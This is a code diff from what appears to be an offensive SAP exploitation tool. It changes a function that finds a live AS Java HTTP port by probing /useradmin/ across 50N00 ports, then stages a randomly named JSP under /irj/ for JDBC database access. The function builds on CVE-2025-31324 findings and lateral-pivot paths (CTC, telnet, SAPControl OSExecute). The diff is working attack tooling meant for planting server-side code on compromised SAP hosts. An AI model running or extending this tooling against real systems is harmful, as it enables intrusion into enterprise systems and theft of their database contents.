@@ -136,63 +136,98 @@ def _ensure_java_db_jsp(node: SAPNode) -> str:
         print(f"[!] {node.sid}: cached JDBC JSP no longer responds — discarding")
         node.java_db_jsps.remove(cached)
 
-    # Resolve Java HTTP port.
-    http_port = getattr(node, "cve_2025_31324_port", 0) or 0
+    # Issue #255 — resolve host AND port from the owning instance
+    # (previously host was node.ip, paired with an instance-derived
+    # port — wrong box on a multi-host node).  host_for_jsp is also
+    # what the JSP URL below is built against, so the deploy writes
+    # to the box the URL will later fetch from.
+    #
+    # Adversarial review of the first #255 cut caught: delegating the
+    # whole resolution to _find_java_http_endpoint made its convention
+    # step (5NN00 unconditionally) fire ahead of the authoritative
+    # /useradmin/ sweep below — so a node with scanned instances but
+    # no Java HTTP actually listening would get http_port=50000 by
+    # convention and the sweep's "does this port answer?" probe
+    # never ran.  Restore the pre-#255 ordering inline: CVE scalar,
+    # labelled java_http, THEN the sweep, THEN the helper (which is
+    # now label+convention only).
+    from sapmap_exploit import (_find_java_http_endpoint, _inst_host,
+                                 _host_for_port)
+    http_port = int(getattr(node, "cve_2025_31324_port", 0) or 0)
+    host_for_jsp = _host_for_port(node, http_port) if http_port else ""
     if not http_port:
         for inst in node.instances:
-            for p, svc in inst.ports.items():
+            for p, svc in (inst.ports or {}).items():
                 if svc == "java_http":
-                    http_port = p; break
-            if http_port: break
+                    http_port = p
+                    host_for_jsp = _inst_host(inst, node)
+                    break
+            if http_port:
+                break
     if not http_port:
         # Self-discovery: probe /useradmin/ across the common Java
-        # HTTP ports (50N00).  A HTTP response — any status — proves
-        # the port hosts an AS Java, so we can target it for deploy.
-        # This covers the case where the port came from a lateral-
-        # pivot destination (e.g. S4H_TO_SJJ at :50200) and no
-        # standalone fingerprint pass ever ran against the node.
-        _host = node.ip or node.hostname
-        if _host:
-            print(f"[*] {node.sid}: no Java HTTP port on node — sweeping "
-                  f"50N00 candidates via /useradmin/ probe")
-            try:
-                import sapmap_rfc as _rfc_pre
-                _seen = set()
-                _cands = []
-                for _inst in getattr(node, "instances", []) or []:
-                    try:
-                        _nn = int(_inst.instance_nr)
-                        _p = 50000 + _nn * 100
-                        if _p not in _seen:
-                            _seen.add(_p); _cands.append(_p)
-                    except (ValueError, AttributeError, TypeError):
-                        pass
+        # HTTP ports (50N00) — but at each INSTANCE's own host, not
+        # a single node-level fallback (issue #255).  Covers the case
+        # where the port came from a lateral-pivot destination (e.g.
+        # S4H_TO_SJJ at :50200) and no fingerprint pass ran against
+        # the node.
+        try:
+            import sapmap_rfc as _rfc_pre
+            _seen = set()
+            _cands = []  # (host, port) pairs
+            for _inst in getattr(node, "instances", []) or []:
+                _inst_h = _inst_host(_inst, node)
+                if not _inst_h:
+                    continue
+                try:
+                    _nn = int(_inst.instance_nr)
+                    _p = 50000 + _nn * 100
+                    key = (_inst_h, _p)
+                    if key not in _seen:
+                        _seen.add(key); _cands.append(key)
+                except (ValueError, AttributeError, TypeError):
+                    pass
+            # Fallback blind sweep uses node-level host (no owning
+            # instance to attribute these to).
+            _node_h = node.ip or node.hostname
+            if _node_h:
                 for _fb in (50000, 50100, 50200, 50300):
-                    if _fb not in _seen:
-                        _seen.add(_fb); _cands.append(_fb)
-                for _p in _cands:
-                    _url = f"http://{_host}:{_p}/useradmin/"
-                    _r = _rfc_pre.http_basic_auth_probe(
-                        _url, "sapmap_probe", "x", timeout=3.0)
-                    if _r.get("ok"):
-                        print(f"[+] {node.sid}: probe found live Java "
-                              f"HTTP port {_p} (HTTP {_r.get('status')})")
-                        http_port = _p
-                        # Backfill onto node so future ops skip the sweep.
-                        from sapmap_exploit import _mark_java_http_port
-                        _mark_java_http_port(node, _p)
-                        break
-            except Exception as _e:
-                print(f"[!] {node.sid}: Java HTTP port sweep errored "
-                      f"({type(_e).__name__}: {_e}) — will bail out")
+                    key = (_node_h, _fb)
+                    if key not in _seen:
+                        _seen.add(key); _cands.append(key)
+            if _cands:
+                print(f"[*] {node.sid}: no Java HTTP port on node — sweeping "
+                      f"{len(_cands)} candidate(s) via /useradmin/ probe")
+            for _h, _p in _cands:
+                _url = f"http://{_h}:{_p}/useradmin/"
+                _r = _rfc_pre.http_basic_auth_probe(
+                    _url, "sapmap_probe", "x", timeout=3.0)
+                if _r.get("ok"):
+                    print(f"[+] {node.sid}: probe found live Java "
+                          f"HTTP port {_p} on {_h} "
+                          f"(HTTP {_r.get('status')})")
+                    http_port = _p
+                    host_for_jsp = _h
+                    # Issue #255 — backfill onto the OWNING instance
+                    # (the one whose _inst_host matched _h), not the
+                    # first-instance-wins pre-#255 behaviour that
+                    # poisoned _host_for_port on multi-host nodes.
+                    from sapmap_exploit import _mark_java_http_port
+                    _mark_java_http_port(node, _p, host=_h)
+                    break
+        except Exception as _e:
+            print(f"[!] {node.sid}: Java HTTP port sweep errored "
+                  f"({type(_e).__name__}: {_e}) — will bail out")
     if not http_port:
         print(f"[-] {node.sid}: no Java HTTP port known — cannot deploy JDBC JSP")
         return ""
+    if not host_for_jsp:
+        host_for_jsp = node.ip or node.hostname
     java_inst = (http_port - 50000) // 100
 
     jsp_name = "jdb" + "".join(_r.choice(_s.ascii_lowercase) for _ in range(6)) + ".jsp"
     target_path = _java_jsp_target_path(node, java_inst, jsp_name)
-    jsp_url = f"http://{node.ip or node.hostname}:{http_port}/irj/{jsp_name}"
+    jsp_url = f"http://{host_for_jsp}:{http_port}/irj/{jsp_name}"
     _ctc_ok    = _ctc_deploy_available(node)
     _telnet_ok = (not _ctc_ok) and _telnet_deploy_available(node)
     # SAPControl OSExecute pivot — when a Type-G destination has been
